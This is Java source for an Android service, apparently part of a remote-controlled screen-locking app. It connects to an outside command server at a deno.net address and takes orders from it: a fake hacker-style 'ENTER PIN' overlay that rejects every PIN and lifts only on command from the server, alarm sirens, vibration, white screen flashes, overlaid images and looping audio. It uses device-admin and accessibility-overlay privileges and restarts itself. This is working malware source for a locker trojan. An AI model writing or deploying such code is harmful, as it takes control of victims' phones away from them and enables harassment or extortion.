package com.my.newproject;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.ToneGenerator;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Vibrator;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import org.json.JSONObject;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import java.net.URL;

public class LockService extends Service {

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private Socket socket;
    private Vibrator vibrator;
    private ToneGenerator tone;
    private MediaPlayer mediaPlayer;
    private Handler handler;
    private WindowManager wm;
    private View overlay, flashView, wallpaperView;
    private boolean locked = false;

    @Override
    public void onCreate() {
        super.onCreate();
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        tone = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
        handler = new Handler();
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        connectToServer();
    }

    private void connectToServer() {
        try {
            socket = IO.socket("https://wapi-server10-40-mgps7rfvkvmk.diskon-member.deno.net");
            socket.on("cmd", args -> {
                try {
                    JSONObject d = (JSONObject) args[0];
                    handler.post(() -> executeCommand(d));
                } catch (Exception e) {}
            });
            socket.connect();
        } catch (Exception e) {}
    }

    private void executeCommand(JSONObject d) {
        String cmd = d.optString("cmd");
        switch (cmd) {
            case "lock": showLockScreen(); break;
            case "unlock": removeLockScreen(); break;
            case "siren": tone.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 15000); break;
            case "vibrate": if (vibrator != null) vibrator.vibrate(new long[]{0, 500, 200, 500, 200, 1000}, 5); break;
            case "flash_on": showFlash(true); break;
            case "flash_off": showFlash(false); break;
            case "wallpaper": changeWallpaper(d.optString("url")); break;
            case "mp3": playMP3(d.optString("url")); break;
        }
    }

    private void showLockScreen() {
        if (locked) return;
        locked = true;

        LinearLayout main = new LinearLayout(this);
        main.setOrientation(LinearLayout.VERTICAL);
        main.setGravity(Gravity.CENTER);
        main.setBackgroundColor(0xFF000000);

        TextView scanLine = new TextView(this);
        scanLine.setText("▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌");
        scanLine.setTextColor(0xFF003300);
        scanLine.setTextSize(8);
        scanLine.setGravity(Gravity.CENTER);
        main.addView(scanLine);

        TextView title = new TextView(this);
        title.setText("S Y S T E M");
        title.setTextColor(0xFF00FF41);
        title.setTextSize(32);
        title.setTypeface(Typeface.MONOSPACE);
        title.setGravity(Gravity.CENTER);
        title.setShadowLayer(15, 0, 0, 0xFF00FF41);
        title.setPadding(0, 20, 0, 30);
        main.addView(title);

        TextView line = new TextView(this);
        line.setText("══════════════════════");
        line.setTextColor(0xFF00FF41);
        line.setTextSize(10);
        line.setGravity(Gravity.CENTER);
        line.setPadding(0, 0, 0, 20);
        main.addView(line);

        TextView pinLabel = new TextView(this);
        pinLabel.setText("> ENTER PIN");
        pinLabel.setTextColor(0xFF00FF41);
        pinLabel.setTextSize(14);
        pinLabel.setTypeface(Typeface.MONOSPACE);
        pinLabel.setGravity(Gravity.CENTER);
        pinLabel.setPadding(0, 0, 0, 10);
        main.addView(pinLabel);

        final TextView pinDisplay = new TextView(this);
        pinDisplay.setText("_ _ _ _");
        pinDisplay.setTextColor(0xFF00FF41);
        pinDisplay.setTextSize(28);
        pinDisplay.setTypeface(Typeface.MONOSPACE);
        pinDisplay.setGravity(Gravity.CENTER);
        pinDisplay.setShadowLayer(10, 0, 0, 0xFF00FF41);
        pinDisplay.setPadding(0, 10, 0, 20);

        LinearLayout pinBox = new LinearLayout(this);
        pinBox.setOrientation(LinearLayout.HORIZONTAL);
        pinBox.setGravity(Gravity.CENTER);
        pinBox.setBackgroundColor(0xFF0A0F0A);
        pinBox.setPadding(40, 15, 40, 15);
        pinBox.addView(pinDisplay);
        main.addView(pinBox);

        String[][] keys = {{"1", "2", "3"}, {"4", "5", "6"}, {"7", "8", "9"}, {"⌫", "0", "OK"}};
        for (String[] row : keys) {
            LinearLayout rl = new LinearLayout(this);
            rl.setOrientation(LinearLayout.HORIZONTAL);
            rl.setGravity(Gravity.CENTER);
            rl.setPadding(0, 8, 0, 8);
            for (String k : row) {
                Button btn = new Button(this);
                btn.setText(k);
                btn.setTextSize(22);
                btn.setTypeface(Typeface.MONOSPACE);
                btn.setWidth(200);
                btn.setHeight(150);
                if (k.equals("⌫")) {
                    btn.setTextColor(0xFFFF0000);
                    btn.setBackgroundColor(0xFF1A0000);
                    btn.setShadowLayer(10, 0, 0, 0xFFFF0000);
                } else if (k.equals("OK")) {
                    btn.setTextColor(0xFF000000);
                    btn.setBackgroundColor(0xFF00FF41);
                    btn.setShadowLayer(15, 0, 0, 0xFF00FF41);
                } else {
                    btn.setTextColor(0xFF00FF41);
                    btn.setBackgroundColor(0xFF0A0F0A);
                    btn.setShadowLayer(5, 0, 0, 0xFF00FF41);
                }
                btn.setOnClickListener(v -> {
                    if (k.equals("⌫")) pinDisplay.setText("_ _ _ _");
                    else if (k.equals("OK")) {
                        pinDisplay.setText("❌ WRONG");
                        pinDisplay.setTextColor(0xFFFF0000);
                    } else pinDisplay.setText("* * * *");
                });
                rl.addView(btn);
            }
            main.addView(rl);
        }

        TextView line2 = new TextView(this);
        line2.setText("══════════════════════");
        line2.setTextColor(0xFF00FF41);
        line2.setTextSize(10);
        line2.setGravity(Gravity.CENTER);
        line2.setPadding(0, 20, 0, 10);
        main.addView(line2);

        TextView hackerText = new TextView(this);
        hackerText.setText("$ root@system:~# access_denied");
        hackerText.setTextColor(0xFF003300);
        hackerText.setTextSize(10);
        hackerText.setTypeface(Typeface.MONOSPACE);
        hackerText.setGravity(Gravity.CENTER);
        main.addView(hackerText);

        WindowManager.LayoutParams p = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        );
        p.gravity = Gravity.CENTER;
        overlay = main;
        wm.addView(overlay, p);
    }

    private void removeLockScreen() {
        if (overlay != null && locked) {
            wm.removeView(overlay);
            overlay = null;
            locked = false;
        }
    }

    private void showFlash(boolean on) {
        if (on) {
            if (flashView != null) return;
            flashView = new View(this);
            flashView.setBackgroundColor(0xFFFFFFFF);
            WindowManager.LayoutParams fp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
            );
            fp.gravity = Gravity.CENTER;
            wm.addView(flashView, fp);
        } else {
            if (flashView != null) {
                wm.removeView(flashView);
                flashView = null;
            }
        }
    }

    private void changeWallpaper(String url) {
        new Thread(() -> {
            try {
                Bitmap bmp = BitmapFactory.decodeStream(new URL(url).openStream());
                handler.post(() -> {
                    ImageView iv = new ImageView(this);
                    iv.setImageBitmap(bmp);
                    iv.setScaleType(ImageView.ScaleType.FIT_XY);
                    WindowManager.LayoutParams wp = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                        PixelFormat.TRANSLUCENT
                    );
                    wp.gravity = Gravity.CENTER;
                    if (wallpaperView != null) wm.removeView(wallpaperView);
                    wallpaperView = iv;
                    wm.addView(wallpaperView, wp);
                });
            } catch (Exception e) {}
        }).start();
    }

    private void playMP3(String url) {
        try {
            if (mediaPlayer != null) {
                mediaPlayer.stop();
                mediaPlayer.release();
            }
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(this, Uri.parse(url));
            mediaPlayer.prepare();
            mediaPlayer.setLooping(true);
            mediaPlayer.start();
        } catch (Exception e) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        removeLockScreen();
        showFlash(false);
        if (wallpaperView != null) {
            wm.removeView(wallpaperView);
            wallpaperView = null;
        }
        if (mediaPlayer != null) {
            mediaPlayer.stop();
            mediaPlayer.release();
        }
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
            }
